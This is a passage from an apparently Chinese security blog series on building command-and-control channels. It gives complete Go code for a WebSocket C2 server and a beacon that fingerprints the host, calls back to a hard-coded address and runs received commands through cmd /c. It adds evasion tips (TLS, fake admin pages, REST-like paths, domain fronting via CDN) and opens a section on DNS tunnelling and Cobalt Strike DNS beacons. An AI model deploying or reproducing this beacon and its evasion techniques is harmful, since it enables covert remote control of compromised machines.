<h1 id="三、WebSocket"><a href="#三、WebSocket" class="headerlink" title="三、WebSocket"></a>三、WebSocket</h1><h2 id="3-1-思路构建"><a href="#3-1-思路构建" class="headerlink" title="3.1 思路构建"></a>3.1 思路构建</h2><p>WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端，主要应用有实时性要求的软件比如说wx、QQ等。在安全领域中，特别是最近几年出现了一种新型的内存马-WebSocket内存马，<strong>因其高隐蔽性（通过HTTP&#x2F;HTTPS建立连接）、双向通信、易于混淆（可混淆uri，伪造成正常实时通信应用）</strong>，而逐渐盛行，所以我就跟风研究一下通信原理并简单实现一个demo。</p>
<p>WebSocket作为通信协议通过 <strong>HTTP 80&#x2F;443端口完成握手（这里的端口都是指server）</strong>，随后流量变为 <strong>二进制帧</strong>，能够有效的突破防火墙限制，建立稳定的通信信道。</p>
<p>很多语言都实现了WebSocket协议，本人又会一点点go语言，所以代码采用Go的 <code>github.com/gorilla/websocket</code> 包来实现。</p>
<p>WebSocket协议本质上是一个基于TCP的协议，它的<strong>建立过程</strong>如下：</p>
<ol>
<li>客户端（一般是浏览器）首先向服务器发送HTTP GET请求，请求头与普通的HTTP请求头不同，需要附加信息”Upgrade: WebSocket”表明这是一个申请协议升级的HTTP请求</li>
<li>服务器解析请求头，知道是要建立Websocket，返回应答信息给客户端</li>
<li>之后就是建立了WebSocket连接，双方通过这个信道传输数据，直到某一方主动关闭连接。</li>
</ol>
<p><strong>WebSocket需要实现长度前缀防止粘包吗</strong>？其实并不需要，WebSocket协议自身已经内置了完善的帧机制，它用自己的方式解决了“粘包”问题，因此在其之上应用层的开发者不需要再额外实现一套长度前缀的逻辑，这一切对开发者来说完全透明，无需关心。</p>
<p>说实话Websocket的思路构建与上面的mTLS类似，我就不在这里过多赘述了。</p>
<h2 id="3-2-代码实现"><a href="#3-2-代码实现" class="headerlink" title="3.2 代码实现"></a>3.2 代码实现</h2><h3 id="3-2-1-server"><a href="#3-2-1-server" class="headerlink" title="3.2.1 server"></a>3.2.1 server</h3><p>定义一个全局升级器 <code>Upgrader</code> 负责把普通HTTP连接升级成WebSocket，主要依据HTTP中请求头是否有 <code>Connection: Upgrade</code> + <code>Upgrade: websocket</code>。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  全局升级器  */</span></span><br><span class="line"><span class="keyword">var</span> upgrader = websocket.Upgrader&#123;  </span><br><span class="line">    CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    HOST = <span class="string">&quot;192.168.3.1&quot;</span>  </span><br><span class="line">    PORT = <span class="string">&quot;8080&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    srv, err := ListenerStart(fmt.Sprintf(<span class="string">&quot;%s:%s&quot;</span>, HOST, PORT))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatal(err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 优雅退出  </span></span><br><span class="line">    sig := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)  </span><br><span class="line">    signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)  </span><br><span class="line">    &lt;-sig  </span><br><span class="line">  </span><br><span class="line">    log.Println(<span class="string">&quot;shutting down...&quot;</span>)  </span><br><span class="line">    srv.Close()  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p><strong>ListenerStart</strong>：既然WebSocket是从普通的HTTP连接升级而来，那必定需要启动一个HTTP服务器，在这里不再需要Gin框架来弄出个HTTP服务器，直接使用 <code>net/http</code> 包简单的弄个HTTP服务器就可以了，将升级服务的uri定义为 <code>/ws</code>，这个路径也是可以换成其他的，然后对这个路径的请求交由 <code>acceptConnections</code> 处理。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ListenerStart 启动 HTTP监听器  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">(addr <span class="type">string</span>)</span></span> (*http.Server, <span class="type">error</span>) &#123;  </span><br><span class="line">    mux := http.NewServeMux()  </span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/ws&quot;</span>, acceptConnections) <span class="comment">// 把 WS 升级路径挂进去  </span></span><br><span class="line">  </span><br><span class="line">    srv := &amp;http.Server&#123;Addr: addr, Handler: mux&#125;  </span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := srv.ListenAndServe(); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;  </span><br><span class="line">          log.Fatalf(<span class="string">&quot;listen: %v&quot;</span>, err)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;()  </span><br><span class="line">    log.Println(<span class="string">&quot;websocket listener started on&quot;</span>, addr)  </span><br><span class="line">    <span class="keyword">return</span> srv, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>acceptConnections</strong>：用全局升级器 <code>Upgrader</code> 将HTTP升级到WebSocket后，把 <code>conn</code> 连接交给 <code>handleConnection</code> 处理业务逻辑</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// acceptConnections HTTP升级到WS后，把连接交给handleConnection  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">acceptConnections</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;  </span><br><span class="line">    conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Printf(<span class="string">&quot;upgrade: %v&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Printf(<span class="string">&quot;new websocket %v&quot;</span>, conn.RemoteAddr())  </span><br><span class="line">    <span class="comment">// 一条 goroutine 对应一条 WS 连接  </span></span><br><span class="line">    <span class="keyword">go</span> handleConnection(conn)  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>handleConnection</strong>：这里主要实现业务相关的逻辑，很简单就是使用 <code>conn.ReadMessage</code> 从连接中读取心跳包，然后直接打印输出。</p>
<p>接下来就是进入主循环：</p>
<ol>
<li>从标准出入中读取命令，并用 <code>conn.WriteMessage(websocket.TextMessage, []byte(cmdLine))</code> 写入到连接中，其中 <code>websocket.TextMessage</code> 消息类型常量，它的作用就是按什么方式去处理数据，比如说 <code>conn.WriteMessage(websocket.TextMessage, []byte(data))</code> 就是按文本的方式去写入数据到连接中。</li>
<li>接下来就是使用 <code>conn.ReadMessage</code> 读取回显，如果Beacon不使用 <code>conn.WriteMessage</code> 发送数据，则server会阻塞在这里</li>
<li>结果直接打印输出，没啥好说的。</li>
</ol>
<p>补充消息类型：</p>
<table>
<thead>
<tr>
<th>符号常量</th>
<th>数值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>websocket.TextMessage</code></td>
<td>1</td>
<td>UTF-8 文本帧</td>
</tr>
<tr>
<td><code>websocket.BinaryMessage</code></td>
<td>2</td>
<td>二进制帧</td>
</tr>
<tr>
<td><code>websocket.CloseMessage</code></td>
<td>8</td>
<td>关闭帧（带状态码）</td>
</tr>
<tr>
<td><code>websocket.PingMessage</code></td>
<td>9</td>
<td>心跳 Ping</td>
</tr>
<tr>
<td><code>websocket.PongMessage</code></td>
<td>10</td>
<td>心跳 Pong</td>
</tr>
</tbody></table>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handleConnection 从socket中读写数据  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn *websocket.Conn)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 心跳包  </span></span><br><span class="line">    _, online, _ := conn.ReadMessage()  </span><br><span class="line">    log.Printf(<span class="string">&quot;online: %s&quot;</span>, online)  </span><br><span class="line">    conn.WriteMessage(websocket.TextMessage, []<span class="type">byte</span>(<span class="string">&quot;server ok&quot;</span>))  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 从标准输入中读取命令  </span></span><br><span class="line">       fmt.Print(<span class="string">&quot;Cmd&gt;&gt;&gt; &quot;</span>)  </span><br><span class="line">       cmdLine, _ := bufio.NewReader(os.Stdin).ReadString(<span class="string">&#x27;\n&#x27;</span>)  </span><br><span class="line">       cmdLine = strings.TrimRight(cmdLine, <span class="string">&quot;\r\n&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cmdLine == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 下发命令  </span></span><br><span class="line">       <span class="keyword">if</span> err := conn.WriteMessage(websocket.TextMessage, []<span class="type">byte</span>(cmdLine)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 读取回显  </span></span><br><span class="line">       _, msg, err := conn.ReadMessage()  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 用来区分正常关闭还是异常断开。  </span></span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> websocket.IsUnexpectedCloseError(err,  </span><br><span class="line">             websocket.CloseGoingAway, websocket.CloseNormalClosure) &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;abnormal close: %v&quot;</span>, err)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             log.Println(<span class="string">&quot;client closed&quot;</span>)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 输出任务数据  </span></span><br><span class="line">       log.Printf(<span class="string">&quot;output: %s\n&quot;</span>, <span class="type">string</span>(msg))  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-2-beacon"><a href="#3-2-2-beacon" class="headerlink" title="3.2.2 beacon"></a>3.2.2 beacon</h3><p>代码其实没啥好说的，其实本文中的所有代码示例都属于简单明了，只为看清数据之间的传输。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>  </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gorilla/websocket&quot;</span>    </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/rand/v2&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/url&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>    </span><br><span class="line">    <span class="string">&quot;websocket/utils&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Sleep           <span class="type">int32</span>  </span><br><span class="line">    Jitter          <span class="type">int32</span>  </span><br><span class="line">    CallBackAddress <span class="type">string</span>  </span><br><span class="line">    URI             <span class="type">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconId    <span class="type">int32</span>  <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    Sleep       <span class="type">int32</span>  <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter      <span class="type">int32</span>  <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    PID         <span class="type">int32</span>  <span class="string">`json:&quot;pid&quot;`</span>  </span><br><span class="line">    ACP         <span class="type">int32</span>  <span class="string">`json:&quot;acp&quot;`</span>  </span><br><span class="line">    InternalIP  <span class="type">int32</span>  <span class="string">`json:&quot;internal_ip&quot;`</span>  </span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;computer&quot;`</span>  </span><br><span class="line">    Username    <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span>  </span><br><span class="line">    ProcessName <span class="type">string</span> <span class="string">`json:&quot;process_name&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> beaconProfile = BeaconConfig&#123;  </span><br><span class="line">    Sleep:           <span class="number">5</span>,  </span><br><span class="line">    Jitter:          <span class="number">2</span>,  </span><br><span class="line">    CallBackAddress: <span class="string">&quot;192.168.3.1:8080&quot;</span>,  </span><br><span class="line">    URI:             <span class="string">&quot;/ws&quot;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> heartBeat = HeartBeat&#123;  </span><br><span class="line">    BeaconId:    rand.Int32(),  </span><br><span class="line">    Sleep:       beaconProfile.Sleep,  </span><br><span class="line">    Jitter:      beaconProfile.Jitter,  </span><br><span class="line">    PID:         <span class="type">int32</span>(os.Getpid()),  </span><br><span class="line">    ACP:         utils.GetCodePageANSI(),  </span><br><span class="line">    InternalIP:  <span class="type">int32</span>(utils.GetInternalIp()),  </span><br><span class="line">    Computer:    utils.GetComputerName(),  </span><br><span class="line">    Username:    utils.GetUsername(),  </span><br><span class="line">    ProcessName: utils.GetProcessName(),  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    <span class="comment">// 拨号 + WS 握手  </span></span><br><span class="line">    u := url.URL&#123;Scheme: <span class="string">&quot;ws&quot;</span>, Host: beaconProfile.CallBackAddress, Path: beaconProfile.URI&#125;  </span><br><span class="line">    conn, _, err := websocket.DefaultDialer.Dial(u.String(), <span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;dial: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 发送上线包  </span></span><br><span class="line">    data, err := json.Marshal(heartBeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;marshal heartbeat: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := conn.WriteMessage(websocket.TextMessage, data); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;send online: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Println(<span class="string">&quot;a connection was successfully established&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       <span class="comment">// 读取命令  </span></span><br><span class="line">       _, cmdLine, err := conn.ReadMessage()  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> err == io.EOF &#123;  </span><br><span class="line">             log.Println(<span class="string">&quot;server gone&quot;</span>)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;read: %v&quot;</span>, err)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span> <span class="type">string</span>(cmdLine) != <span class="string">&quot;server ok&quot;</span> &#123;  </span><br><span class="line">          <span class="comment">// 执行命令  </span></span><br><span class="line">          cmd := exec.Command(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="type">string</span>(cmdLine))  </span><br><span class="line">          <span class="keyword">var</span> outBuf, errBuf bytes.Buffer  </span><br><span class="line">          cmd.Stdout = &amp;outBuf  </span><br><span class="line">          cmd.Stderr = &amp;errBuf  </span><br><span class="line">          err = cmd.Run()  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// 获取输出  </span></span><br><span class="line">          output := outBuf.String()  </span><br><span class="line">          <span class="keyword">if</span> output == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">             output = errBuf.String()  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; output == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">             output = err.Error()  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// 回传结果  </span></span><br><span class="line">          <span class="keyword">if</span> err := conn.WriteMessage(websocket.TextMessage, []<span class="type">byte</span>(output)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;write: %v&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-3-流量分析"><a href="#3-3-流量分析" class="headerlink" title="3.3 流量分析"></a>3.3 流量分析</h2><p><code>Connection: Upgrade+Upgrade: websocket</code> 表明这是一个HTTP升级WebSocket的请求包</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/16/21-40-55-d3d9663f45f626ee7500c36f156c0c6d-20250916214055-fc5644.png"></p>
<p>服务器返回响应，转换协议</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/16/21-45-48-c5c544df52d2f8877539740b0d91ec59-20250916214547-3db09b.png"></p>
<p>可以看到这是Beacon给Server的心跳包数据，很明显这是明文数据。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/16/21-47-27-b553be5f736b2d6d8bcc4ab63e322d93-20250916214726-6f4109.png"></p>
<p>看了流量分析之后，又有了改进方向，我太懒了就不写了，在这里给思路</p>
<ol>
<li>使用HTTP协议请求建立WSS连接，Beacon端修改 <code>url.URL</code> 和 <code>websocket.Dialer</code> 有相关参数；Server在使用http.Server创建server对象时可以配置tls证书参数，具体怎么写找资料。</li>
<li>既然涉及到HTTP服务器，那我们就可以修改请求头，除此之外也可以起一个某某后台管理系统的html页面</li>
<li>升级WebSocket的uri路径可以修改成 <code>/api/v1/sync</code> 等符合像REST风格的形式</li>
<li>还是因为用到了HTTP协议， 我们可以使用域名前置+CDN 隐藏真实vps的IP</li>
<li>etc ..</li>
</ol>
<h1 id="四、DNS"><a href="#四、DNS" class="headerlink" title="四、DNS"></a>四、DNS</h1><p>终于是来到本文中最具有挑战性和研究价值的C2通信协议——DNS，也是本人自认为写的还行的部分，希望对各位师傅有一点点帮助。</p>
<h2 id="4-1-前置知识"><a href="#4-1-前置知识" class="headerlink" title="4.1 前置知识"></a>4.1 前置知识</h2><h3 id="（一）DNS协议"><a href="#（一）DNS协议" class="headerlink" title="（一）DNS协议"></a>（一）DNS协议</h3><p><strong>DNS</strong>（Domain Name System，域名系统）是互联网中用于将域名转换为 IP 地址的分布式系统，由于绝大多数企业防火墙和入侵检测系统都允许内部网络主机向外发起DNS查询（UDP 53端口），并且通常不会深入检查每个DNS数据包的有效载荷是否合规，这种通信方式得以混杂在海量的正常DNS流量中，难以被察觉。</p>
<p> 在C2中我们可以借助DNS协议将通信流量伪装成正常的DNS查询从而有效地规避安全防护软件的检测，这种技术被称为<strong>DNS隧道（DNS Tunneling）</strong>。</p>
<blockquote>
<p><strong>隧道</strong>：就是把一种协议的数据包（或字节流）完整封装进另一种协议的载荷（payload）里，让后者充当“运输卡车”，穿越原本无法直接通行的网络路径。。</p>
</blockquote>
<p><strong>DNS监听器</strong>是C2基础设施中极为特殊且关键的一类服务。与普通DNS服务器不同，它并非用于解析合法域名，而是专门用于<strong>解析由受控主机发起的、伪装成正常DNS查询的隐蔽通信</strong>。通过这种机制，攻击者得以实现远程命令控制和数据回传，使其成为绕过传统网络防御体系的<strong>核心枢纽</strong>。</p>
<p><strong>资源记录</strong>：也就是DNS数据库中的“一行”。</p>
<p><strong>记录类型</strong>：DNS数据库里“这一行”到底存了什么种类的记录。常见的记录类型有：</p>
<table>
<thead>
<tr>
<th align="left">类型代码</th>
<th align="left">名称</th>
<th align="left">含义与典型用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>A</strong></td>
<td align="left">返回4字节的IPv4地址，常用隐藏控制信号</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>NS</strong></td>
<td align="left">将某个域及其子域委托给另一个DNS服务器解析</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>CNAME</strong></td>
<td align="left">它可以将一个域名指向另一个域名，常用于CDN、多域名指向同一服务等</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><strong>TXT</strong></td>
<td align="left">返回任意文本</td>
</tr>
<tr>
<td align="left">28</td>
<td align="left"><strong>AAAA</strong></td>
<td align="left">返回16字节的IPv6地址</td>
</tr>
</tbody></table>
<p>在C2通信场景里，最常用的是：<strong>A</strong>、<strong>TXT</strong> 、<strong>AAAA</strong>，≤4B用 A，≤16B用AAAA，大块数据用TXT分片；</p>
<h3 id="（二）报文结构"><a href="#（二）报文结构" class="headerlink" title="（二）报文结构"></a>（二）报文结构</h3><p>报文结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|        Header       |  12 字节</span><br><span class="line">+---------------------+</span><br><span class="line">|       Question      |  问什么域名/类型</span><br><span class="line">+---------------------+</span><br><span class="line">|        Answer       |  答什么资源记录（RR）</span><br><span class="line">+---------------------+</span><br><span class="line">|      Authority      |  权威 NS（可选）</span><br><span class="line">+---------------------+</span><br><span class="line">|      Additional     |  附加信息（EDNS0 等）</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p><code>dns.Msg</code> 实现了报文结构</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> Msg <span class="keyword">struct</span> &#123;  </span><br><span class="line">    MsgHdr  </span><br><span class="line">    Compress <span class="type">bool</span>       <span class="string">`json:&quot;-&quot;`</span> <span class="comment">// If true, the message will be compressed when converted to wire format.  </span></span><br><span class="line">    Question []Question <span class="comment">// Holds the RR(s) of the question section.  </span></span><br><span class="line">    Answer   []RR       <span class="comment">// Holds the RR(s) of the answer section.  </span></span><br><span class="line">    Ns       []RR       <span class="comment">// Holds the RR(s) of the authority section.  </span></span><br><span class="line">    Extra    []RR       <span class="comment">// Holds the RR(s) of the additional section.  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-2-Cobalt-Strike-DNS-Beacon使用"><a href="#4-2-Cobalt-Strike-DNS-Beacon使用" class="headerlink" title="4.2 Cobalt Strike DNS Beacon使用"></a>4.2 Cobalt Strike DNS Beacon使用</h2><p>在计划之初我还想介绍一下sliver DNS beacon的使用，因为sliver是一个开源的项目，我可以一窥大佬们是如何实现DNS监听器的，但是不知道什么原因，我花了几天的时间都没能成功上线sliver DNS beacon，所以这里只介绍Cobalt Strike DNS Beacon使用。</p>
<h3 id="（一）注册域名和添加记录"><a href="#（一）注册域名和添加记录" class="headerlink" title="（一）注册域名和添加记录"></a>（一）注册域名和添加记录</h3><p>为了跟贴近实战，我们需要去可以云服务提供商（阿里云、腾讯云、aws、godaddy和cloudflare）注册一个域名，如何注册我就不再这里演示了。在这里，我花费巨资注册了一个域名，只为贴近实战&gt;.&lt;</p>
